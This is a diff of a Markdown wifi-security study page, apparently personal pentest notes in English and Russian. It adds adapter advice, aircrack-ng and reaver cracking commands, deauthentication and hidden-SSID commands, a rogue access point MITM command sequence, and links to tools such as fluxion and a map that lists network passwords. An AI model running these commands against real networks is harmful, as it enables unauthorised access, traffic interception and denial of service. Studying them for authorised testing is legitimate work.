@@ -161,6 +161,7 @@ WNIC
 
 * [What is the best wireless card to buy (by aircrack-ng.org)](https://www.aircrack-ng.org/doku.php?id=faq#what_is_the_best_wireless_card_to_buy)
 * [Top Wardriving USB adapters](http://www.wirelesshack.org/top-wardriving-usb-adapters.html)
+* [Список Wi-Fi адаптеров пригодных для Wardriving'а](https://forum.antichat.ru/threads/57249/)
 
 * (by @090h)(for hackers)
 
@@ -170,6 +171,19 @@ WNIC
     - Alfa AWUS051NH v2 (2.4 & 5 GHz) long range 
     - Ralink 3070 based cards (MediaTek now)
     - any *MAC80211*
+
+* for 802.11ac ([How to get your new 5 GHz ...](https://medium.com/@adam.toscher/configure-your-new-wireless-ac-1fb65c6ada57))
+    <br> `apt install realtek-rtl88xxau-dkms`
+
+    - Alfa AWUS036ACH - RTL8812AU (802.11a/b/g/n/ac)
+        <br> brother (~same chipset): [Alfa AWUS036AC](https://wikidevi.com/wiki/ALFA_Network_AWUS036AC) - RTL8812U (802.11a/b/g/n/ac)
+    - Alfa AWUS1900 - RTL8814U (802.11a/b/g/n/ac)
+
+Some antennas: Alfa ARS-N19, Alfa APA-M25 (2.4GHz 8dBi, 5GHz 5dBi)
+
+В РФ рекомендуется покупать радио в [дальрадио](www.dalradio.ru)
+
+В РФ роскомнадзор запрещает использование передатчиков мощностью более 100 мВт (более мощные передатчики необходимо регистрировать в соответствии с ФЗ о связи ст. XXX п. Y)
 
 ---
 
@@ -362,20 +376,20 @@ Last digit is checksum of first 7 digits.
 
 ***Authentication modes***:
 
-- **WPA Enterprise** = 802.1X + EAP + (TKIP/CCMP) + MIC
+- **WPA Enterprise (MGT)** = 802.1X + EAP + (TKIP/CCMP) + MIC
 
     802.1X - authenticated key management (used for EAP encapsulation)
     
-    - ***EAP - Extensible Authentication protocol*** - ahortly and roughly: it is authentication with RADIUS server
+    - ***EAP - Extensible Authentication protocol*** - shortly and roughly: it is authentication with RADIUS server
     - ***TKIP - Temporal Key Integrity Protocol*** - (WPA) (deprecated since 2012). Encryption standard (algorithm, keys, IV), has rekeying mechanism.
-        <br>***CCMP - Counter Mode CBC-MAC Protocol*** - (WPA2). Encryption standard (algorithm, keys, IV)
+        <br> ***CCMP - Counter Mode CBC-MAC Protocol*** - (WPA2). Encryption standard (algorithm, keys, IV)
     - ***MIC - Message Integrity Code***
 
-- **WPA Personal** = **WPA-PRE (WPA Pre-shared key)**
+- **WPA Personal** = **WPA-PSK (WPA Pre-Shared Key)**
     
     Based on 4-way handshake ([detailed explanation](https://en.wikipedia.org/wiki/IEEE_802.11i-2004)):
 
-        Client and AP, both has PSK (Pre-Shared Key) `= PBKDF2-SHA1 (password)`, which is identical to PMK (Pairwise Master Key) in this authentication mode.
+        Client and AP, both has PSK (Pre-Shared Key) `= PBKDF2-SHA1 (password)` (256 bit), which is identical to PMK (Pairwise Master Key) in this authentication mode.
         PTK (64 byte Pairwise Transient Key) construction = concat( PMK | ANonce | SNonce | AP MAC-addr | STA MAC-addr )
         GTK (32 bytes Group Temporal Key)
 
@@ -785,13 +799,13 @@ WPA uses TKIP based on RC4, but because of better mixing function of key and IV,
 
 - [***KRACK attack***](https://www.krackattacks.com/)
 
-    Error in protocol results in possibility to MITM traffic for a lot of devices (idea is based on dropping IV vector of cryptography algorithm, for some devices (e.g. Androids) even the whole key are dropped to zero values)
+    Error in protocol results in a possibility to MITM traffic for a lot of devices (idea is based on dropping IV vector of cryptography algorithm, for some devices (e.g. Androids) even the whole key are dropped to zero values)
 
 <br>
 
 ---
 
-# Practice (Offensive)
+# Practice (Offensive) (wardriving)
 
 There is a guy [090h](https://twitter.com/090h) who is a good specialist at practical wifi cracking (practical part of this webpage in many ways is based on my study of his work) <br>
 His [github account](https://github.com/0x90) has a lot of practically interesting repos. Among their number: <br>
@@ -807,6 +821,8 @@ Handy links:
 
     * [3wifi.stascorp.com/map](http://3wifi.stascorp.com/map) - the map of wifi access points, sometimes with passwords
     * [WiGLE (wireless network mapping)](https://wigle.net/) - all the networks found by everyone - map of wifi APs
+* [WiFiAnalyzer](https://play.google.com/store/apps/details?id=com.vrem.wifianalyzer) - nice wifi scanner for Android
+    <br> [WiFi explorer pro](https://www.adriangranados.com/apps/wifi-explorer) - nice wifi scanner for MacOs
 
 Usefull facts:
 
@@ -815,46 +831,64 @@ Usefull facts:
 
 <br>
 
+---
+
+## basics (iw, aircrack, ...)
+
 #### Some general-purpose commands
 
 ``` bash
+    ifconfig up/down
     iwconfig, iw dev, iw phy wlan1
 ```
 
 <br>
 
-#### Tunning and preparations
+#### Tuning and preparations
 
 *   Changing country:
 
     ``` bash
-        iw reg get
-        iw reg set BZ # BZ is better then BO
+    iw reg get
+    iw reg set BZ # BZ is better then BO
     ```
 
 *   Changing channel and power:
 
     ``` bash
-        iwconfig wlan1 channel 13
-        iwconfig wlan1 txpower 30
+    iwconfig wlan1 txpower 30
+    iwconfig wlan1 channel 13
     ```
 
     ``` bash
-        iw phy wlan1 set txpower fixed 30mBm
+    iw phy wlan1 set txpower fixed 30mBm
+    ```
+
+*   Chaning mac-address:
+
+    ``` bash
+    macchanger -r wlan0
     ```
 
 *   Disabling network manager for wlan interface:
 
     ``` bash
-        cat >> /etc/NetworkManager/NetworkManager.conf
-        [keyfile]
-        unmanaged-devices=interface-name:wlan1mon;interface-name:wlan1
+    cat >> /etc/NetworkManager/NetworkManager.conf
+    [keyfile]
+    unmanaged-devices=interface-name:wlan1mon;interface-name:wlan1
     ```
 
 *   Change card mode to Monitor mode:
 
     ``` bash
-        airmon-ng start wlan1
+    airmon-ng start wlan1
+    # iw dev wlan0 add interface mon0 type monitor
+    ```
+
+    ``` bash
+    ifconfig wlan0 down
+    iwconfig wlan0 mode monitor
+    ifconfig wlan0 up
     ```
 
 #### Play with traffic
@@ -862,9 +896,9 @@ Usefull facts:
 *   Monitor for APs (especially for WPS)
 
     ``` bash
-        airodump-ng wlan1mon # This will also dump traffic
-        wash -i wlan0mon
-        wpsig # monitor for wps APs
+    airodump-ng wlan1mon # This will also dump traffic
+    wash -i wlan0mon
+    wpsig # monitor for wps APs
     ```
 
     * {:.dummy} [RouterScan](https://kali.tools/?p=501) ([forum.antichat.ru - routerscan](https://forum.antichat.ru/threads/398971/)) - scans Wifi, searching for routers and extracts information about them
@@ -872,26 +906,62 @@ Usefull facts:
 *   **Dump/capture/monitor** packets:
 
     ``` bash
-        airodump-ng wlan1mon
-        airodump-ng -c 9 --bssid id -w output.cap --showack wlan1mon
-        pyrit -i wlan1mon -o $(date +%Y-%m-%d_%H)_stripped_live.cap --strip-live --all-handshakes
+    airodump-ng wlan1mon
+    airodump-ng -c 9 --bssid id -w output.cap --showack wlan1mon
+    pyrit -i wlan1mon -o $(date +%Y-%m-%d_%H)_stripped_live.cap --strip-live --all-handshakes
     ```
+
+    * verify if handshake in `xxx.cap` file is correct: `cowpatty -r dump.cap -c`
+    * extract hashes in hashcat format: `/usr/lib/hashcat-utils/cap2hccapx.bin xxx.cap xxx.hccap`
+    
 
 *   Monitors:
 
     ``` bash
-        horst -i wlan1mon
-        kismet
+    horst -i wlan1mon
+    kismet
     ```
+
+<br>
+
+#### aircrack-ng
+
+Crack with a different methods ([security-cheatsheets aircrack-ng](https://github.com/Snifer/security-cheatsheets/blob/master/aircrack-ng)):
+
+* To crack WEP for a given essid name and store into a file - `aircrack-ng -a 1 -e <essid> -l <output file> <.cap or .ivs file(s)>`
+* To crack WPA/WPA2 from airolib-ng database - `aircrack-ng -e <essid> -r <database> <.cap or .ivs file(s)>`
+* To crack WPA/WPA2 from a wordlist - `aircrack-ng -e <essid> -w <wordlist> <.cap or .ivs file(s)>`
+* To crack a given bssid - `aircrack-ng -b <bssid> -l <output file> <.cap or .ivs file(s)>`
+* To crack a given bssid using FMS/Korek method - `aircrack-ng -K -b <bssid> <.cap or .ivs file(s)>`
+* To crack a given essid (WEP) and display the ASCII of the key - `aircrack-ng -e <essid> -s <.cap of .ivs file(s)>`
+* To crack a given essid (WEP) and create a EWSA Project - `aircrack-ng -e <essid> -E <EWSA file> <.cap or .ivs file(s)>`
+
+<br>
+
+#### attack WPS
+
+Attack WPS with `reaver`:
+
+* `wash –i wlan0mon –C`
+    <br>`reaver –i wlan0mon –b <BSSID> -vv –S`
+* `reaver –i –c <Channel> -b <BSSID> -p <PinCode> -vv –S`
 
 <br>
 
 #### Influence traffic
 
-*   Send deauth example
+*   Send ***deauth*** packets
 
     ``` bash
-        aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan1
+        aireplay-ng -0 10 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan1
+    ```
+
+*   find hidden ssid (whic is used by smbd now)
+
+    ``` bash
+        airmon-ng start wlan0
+        airodump-ng –c <Channel> --bssid <BSSID> wlan0mon
+        aireplay-ng -0 20 –a <BSSID> -c <VictimMac> wlan0mon
     ```
 
 *   Jammers
@@ -901,10 +971,34 @@ Usefull facts:
         aireplay-ng -1 ...
     ```
 
+*   MITM ([security-cheatsheets aircrack-ng](https://github.com/Snifer/security-cheatsheets/blob/master/aircrack-ng))
+
+    ``` bash
+        airmon-ng start wlan0
+        airbase-ng –e "<FakeBSSID>" wlan0mon
+        brctl addbr <VariableName>
+        brctl addif <VariableName> wlan0mon
+        brctl addif <VariableName> at0
+        ifconfig eth0 0.0.0.0 up
+        ifconfig at0 0.0.0.0 up
+        ifconfig <VariableName> up
+        aireplay-ng –deauth 0 –a <BSSID Atack> wlan0mon
+        dhclient3 <VariableName> &
+        wireshark & select <VariableName> interface
+    ```
+
 <br>
+
+---
+
+## complex tools
+
+* [routerscan](https://forum.antichat.ru/threads/398971/) - attack routers from the wired side (brute passwords, etc.)
+* ***mdk3*** - very powerfull utility: can flood, DOS, massive deauth, ... (and others 802.11 exploitations)
 
 #### Create fake APs
 
+* [fakeAP](https://github.com/DanMcInerney/fakeAP) - create fake AP in Kali with 1 command
 * [the MANA toolkit](https://github.com/sensepost/mana) - toolkit for wifi rogue AP attacks and MitM
     <br> [hostapd-mana](https://github.com/sensepost/hostapd-mana) - patches to hostapd for rogue access points
 
@@ -914,6 +1008,7 @@ Usefull facts:
     * [(RU) Rogue AP — фальшивые точки доступа (хабр)](https://habrahabr.ru/company/pentestit/blog/277793/)
 
 * [hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe)
+* [fluxion](https://github.com/FluxionNetwork/fluxion) - set up rogue AP, deauth all users, set up web-site requesting users for Wifi password, redirect all users to website, logs everything until some user will insert correct password for real AP
 
 <br>
 
@@ -923,13 +1018,15 @@ Usefull facts:
     <br>Its main disadvantage is in using single interface, after sending deauth frame, wifite changes card mode to listening mode to catch handshake and during this operation client could have already send handshake.
 * ***r112*** - similar to wifite (???)
 * ***[reaver (2012)](https://code.google.com/archive/p/reaver-wps-fork/)*** - broad spectrum cracking tool (can be used to crack WPS or WPA/WPA2) ([reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x) - fork for cracking WPS with Pixie Dust)
+* ***Fern Wifi Cracker***
+* ***besside-ng***
 
 Handshake bruteforce:
 
 * Hashcat (`aircrack-ng -J file.hccap file2.cap` - extract handshake for hashcat brute, `hashcat.exe -m 2500 ...`)
 * ***Aircrack-ng*** – is an 802.11 WEP and WPA-PSK keys cracking program that can recover keys once enough data packets have been captured.
 * [Pyrit](https://github.com/JPaulMora/Pyrit) - can create precomputed databases
-* coWPAtty
+* `cowpatty` - wpa-psk dictionary attack
 
 <br>
 
@@ -949,6 +1046,13 @@ Scanner-like utilities:
 * [FruityWiFi](http://www.fruitywifi.com/index_eng.html)
 * [Snoopy-ng](https://github.com/sensepost/snoopy-ng)
 
+<br>
+
+#### monitoring utilities
+
+* [waidps](https://github.com/SYWorks/waidps) - wireless auditing, intrusion detection & prevention system
+* [nzyme](https://github.com/lennartkoopmann/nzyme) - collect frames and sends them to Graylog for WiFi IDS, monitoring, and incident response.
+* ***Cisco CleanAir***, WIPS (wireless intrusion prevention system)
 
 <br>
 
